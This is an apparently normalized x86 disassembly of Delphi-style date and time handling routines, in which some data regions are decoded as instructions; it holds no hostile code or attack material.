call sub_419cf0
mov eax rw-data
mov edx [ rw-data ]
call sub_40f614
sub_46a42c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46a451
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a458
retn
sub_46a464
push ebx
push esi
mov ebx edx
mov esi eax
cmp bx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_409a04
test al al
jne r-xdata
and eax 0x7f
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
lea eax [ edx + eax * 8 ]
movzx edx bx
mov ax [ eax + edx * 2 - 0x2 ]
pop esi
pop ebx
retn
mov al 0x1
sub_46a49c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46a4c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a4c8
retn
sub_46a4d4
push 0xe6004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46a519
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a520
retn
sub_46a530
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_46a7ac
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_46a7f0
push ebx
jmp r-xdata
mov cx [ eax + 0x6 ]
cmp cx 0x1
jb r-xdata
xor ecx ecx
mov cl dl
mov bx [ ecx * 4 + rw-data ]
add [ eax + 0x4 ] bx
mov cx [ ecx * 4 + rw-data ]
add [ eax + 0x6 ] cx
cmp cx 0xc
ja r-xdata
pop ebx
retn
sub_46a824
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_46a9b0
jmp r-xdata
mov dx [ esi + 0x8 ]
cmp dx 0x1
jb r-xdata
xor edx edx
mov dl bl
mov dx [ edx * 4 + rw-data ]
add [ esi + 0x6 ] dx
test bl bl
je r-xdata
movzx edx dx
cmp eax edx
jl r-xdata
add [ esi + 0x8 ] ax
sub [ esi + 0x8 ] ax
jmp r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_46a7f0
mov eax esi
call sub_46a9b0
sub_46a878
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xa ]
cmp ax 0x17
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0x8 ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xa ] ax
mov edx ebx
mov eax esi
call sub_46a824
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_46a8bc
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xc ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xa ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xc ] ax
mov edx ebx
mov eax esi
call sub_46a878
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_46a900
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xe ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xc ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xe ] ax
mov edx ebx
mov eax esi
call sub_46a8bc
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_46a944
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_46a7f0
mov edx ebx
mov eax esi
call sub_46a824
mov edx ebx
mov eax esi
call sub_46a878
mov edx ebx
mov eax esi
call sub_46a8bc
mov edx ebx
mov eax esi
call sub_46a900
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_46a900
mov edx ebx
mov eax esi
call sub_46a8bc
mov edx ebx
mov eax esi
call sub_46a878
mov edx ebx
mov eax esi
call sub_46a824
mov edx ebx
mov eax esi
call sub_46a7f0
pop esi
pop ebx
retn
sub_46a9c8
mov cx [ edx + 0x4 ]
sub [ eax + 0x4 ] cx
mov cx [ edx + 0x6 ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0x8 ]
sub [ eax + 0x8 ] cx
mov cx [ edx + 0xa ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0xc ]
sub [ eax + 0xc ] cx
mov cx [ edx + 0xe ]
sub [ eax + 0xe ] cx
mov edx [ edx + 0x10 ]
sub [ eax + 0x10 ] edx
mov dl 0x1
call sub_46a944
retn
sub_46aa08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46a7e4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov ax [ esi + 0x4 ]
add [ ebx + 0x4 ] ax
mov ax [ esi + 0x6 ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0x8 ]
add [ ebx + 0x8 ] ax
mov ax [ esi + 0xa ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0xc ]
add [ ebx + 0xc ] ax
mov ax [ esi + 0xe ]
add [ ebx + 0xe ] ax
mov eax [ esi + 0x10 ]
add [ ebx + 0x10 ] eax
xor edx edx
mov eax ebx
call sub_46a944
sub_46aa5c
push ebx
movsx ecx [ eax + 0x4 ]
movsx ebx [ edx + 0x4 ]
sub ecx ebx
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x6 ]
movzx ebx [ edx + 0x6 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x8 ]
movzx ebx [ edx + 0x8 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xc ]
movzx ebx [ edx + 0xc ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xe ]
movzx ebx [ edx + 0xe ]
sub ecx ebx
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x10 ]
sub ecx [ edx + 0x10 ]
test ecx ecx
jle r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
mov al 0x2
jmp r-xdata
pop ebx
retn
sub_46ab0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_46b0a0
mov esi esp
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46ab30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_46b10c
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46ab5c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403204
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_46b10c
push esi
lea edi [ esi + 0x4 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46abb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_46b0a0
xor edx edx
mov eax edi
call sub_403204
push edi
add edi 0x4
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ac10
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
call sub_46b1dc
xor edx edx
mov eax edi
call sub_403204
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x10
call sub_402998
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ac60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_46ac10
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_46ace0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46ae00
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4152cc
xor eax eax
push ebp
push sub_46ade3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4152dc
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415368
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4152cc
xor eax eax
push ebp
push sub_46adb6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4152e8
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ab5c
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4152d4
retn
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415374
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46abb8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46adea
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4152d4
retn
sub_46ae0c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46af23
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414e58
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_46aadc
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_404860
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41531c
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af2a
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x18 ]
call sub_404714
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_46aadc
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415310
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4152cc
xor eax eax
push ebp
push sub_46aeec
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x7
mov eax [ ebx + 0x8 ]
call sub_46aaf4
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4152e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4152d4
retn
sub_46af34
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ac60
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_4152fc
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_4152dc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46af84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46aa08
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46a9c8
jmp r-xdata
jmp r-xdata
call sub_4152a0
sub_46afb8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_46aa5c
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_46afd8
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
lea eax [ esp + 0x8 ]
call sub_46b154
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax esi
mov edx ebx
call sub_40a858
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_46b014
push ebx
push esi
mov ebx eax
mov si [ ebx + 0x2 ]
cmp si 0xc
ja r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov ax [ ebx ]
call sub_46a464
cmp ax [ ebx + 0x4 ]
jb r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
cmp [ ebx + 0x8 ] 0x3b
ja r-xdata
cmp [ ebx + 0xa ] 0x3b
jbe r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46b054
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edx esp
call sub_40b128
test al al
je r-xdata
test al al
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
call sub_46b10c
lea esi [ esp + 0x8 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_46b014
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_46b0a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b0fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_46b054
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b104
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_46b10c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x2 ]
lea eax [ ebp - 0x4 ]
call sub_409c84
mov ax [ ebp - 0x4 ]
mov [ ebx ] ax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
lea ecx [ ebx + 0xa ]
lea edx [ ebx + 0x8 ]
lea eax [ ebx + 0x6 ]
call sub_4099a8
movzx eax [ ebp - 0x2 ]
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46b154
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46a7ac
test al al
je r-xdata
mov cx [ ebx + 0x4 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409b08
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409968
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409968
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_46b1dc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46b2d8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx eax [ ebx ]
movzx edx [ ebx + 0x2 ]
add eax edx
movzx edx [ ebx + 0x4 ]
add eax edx
mov edx eax
movzx ecx [ ebx + 0x6 ]
add edx ecx
movzx ecx [ ebx + 0x8 ]
add edx ecx
movzx ecx [ ebx + 0xa ]
add edx ecx
test edx edx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2df
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
test eax eax
jle r-xdata
movzx eax [ ebx + 0x6 ]
movzx edx [ ebx + 0x8 ]
add eax edx
movzx edx [ ebx + 0xa ]
add eax edx
test eax eax
jbe r-xdata
mov si [ ebx ]
test si si
je r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp [ ebx + 0x2 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
cmp [ ebx + 0xa ] 0x3b
ja r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x3b
jbe r-xdata
cmp [ ebx + 0x2 ] 0x1f
ja r-xdata
mov dx [ ebx + 0x2 ]
mov eax esi
call sub_46a464
cmp ax [ ebx + 0x4 ]
jae r-xdata
sub_46b2e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b319
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b320
retn
mov eax rw-data
call sub_40d524
sub_46b361
mov bl 0x46
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
xor [ eax ] eax
call 0x2446f416
xor al [ eax ]
adc eax 0x64634245
dec edi
jbe r-xdata
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2446f3ba
xor al [ eax ]
or eax 0x64634245
inc ebp
js r-xdata
push edx
inc ecx
add [ eax - 0x63ffbeae ] dl
push esi
inc ecx
add [ eax + 0x52 ] bh
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
jo r-xdata
popad
popad
outsb
je r-xdata
inc ecx
add [ ebx + edi * 4 + 0x46 ] bh
add [ esp + edi * 4 + 0x4ee40046 ] dh
nop
insb
outsd
ja r-xdata
inc ecx
mov ebx 0xbcb40046
inc esi
add ah ah
dec esi
push edx
inc ecx
outsd
outsb
mov eax eax
dec esp
mov ah 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x140046b4 ] ah
add [ eax ] al
add al dh
pop ebp
inc ecx
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xffffffffec46f47a
imul ebp [ edi + 0x6e ] 0xb3e8c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov bl 0x46
add [ eax + eax ] cl
add [ eax ] al
inc eax
mov bl 0x46
add [ esp + esi + 0x40 ] bh
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
add [ eax ] eax
or [ ecx + 0x73 ] al
inc esp
sbb al 0xb5
inc esi
add [ edi ] al
or edx [ esi + eax * 2 + 0x4d ]
je r-xdata
push eax
stosd [ edi ]
jns r-xdata
push ecx
inc ecx
add [ eax + 0x53 ] al
inc ecx
add [ edx + edx * 2 + 0x41 ] bh
add [ eax - 0x6fffbeae ] dh
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
in al dx
js r-xdata
add [ eax + eax ] 0x8
inc ecx
jae r-xdata
insb
push esp
adc [ eax ] al
aam 0xb7
inc esi
add ah bl
mov eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
or [ ecx + 0x73 ] eax
dec ecx
add [ ebp - 0x7e8fffba ] dh
inc ecx
add [ 0x4d460600 ] al
push esp
inc edx
arpl [ ebp + eax ] sp
mov esp 0x30004010
mov eax 0xb9500046
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
je r-xdata
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
add [ ebx ] cl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
nop
add [ ebp + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xb5
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 4 + 0x280046 ] cl
add [ eax ] al
cld
add [ ecx ] 0x7c
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x3846f52e
stosb [ edi ]
inc ecx
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x55 ] dl
add [ esi + edx * 2 + 0x52780041 ] bl
jo r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_46b657
lea eax [ ebp - 0x4 ]
call sub_404008
retn
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
jb r-xdata
add [ ecx ] cl
inc ecx
jne r-xdata
add [ ebx + edi * 4 + 0x46 ] ch
add al ah
mov ebp 0xbe2c0046
inc esi
add ah al
push edx
inc ecx
add [ esi + ecx * 2 - 0x417bffbf ] ch
inc esi
add [ eax + 0x60004153 ] cl
pop ecx
inc ecx
add [ ecx + ebx * 2 + 0x41 ] ch
add [ ebp + 0x660c0041 ] bl
inc ecx
add [ eax + 0x120046be ] al
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esi + edx * 2 + 0x61 ] sp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] 0xb44cc08b
inc esi
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5efe4d35 ]
inc eax
mov bl 0x46
add al ch
push edi
add edi edx
imul ebp [ esi + 0x67 ] 0x83ec8b55
add al 0x0
or [ ecx + 0x73 ] al
push ebx
adc [ eax ] al
and al 0xb8
inc esi
add [ ecx + edi * 4 + 0x46 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0003 ] al
outsb
je r-xdata
adc [ eax ] al
push 0x440046b7
mov eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jb r-xdata
mov eax ebx
call sub_40905c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
or ecx [ ebp - 0x36cc0bab ]
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
jae r-xdata
inc ecx
outsb
arpl [ ecx - 0x54 ] di
adc [ eax ] al
jl r-xdata
jae r-xdata
add [ eax + 0x41090002 ] al
push esp
push esp
inc esi
dec ebp
inc esi
add [ eax + edi * 4 + 0x46 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080001 ] al
jae r-xdata
outsd
jne r-xdata
sub_46b5f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b650
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax ebx
call sub_40905c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b657
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_46b690
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_46e344
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46b6c4
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_46dfe8
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_46b6f8
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
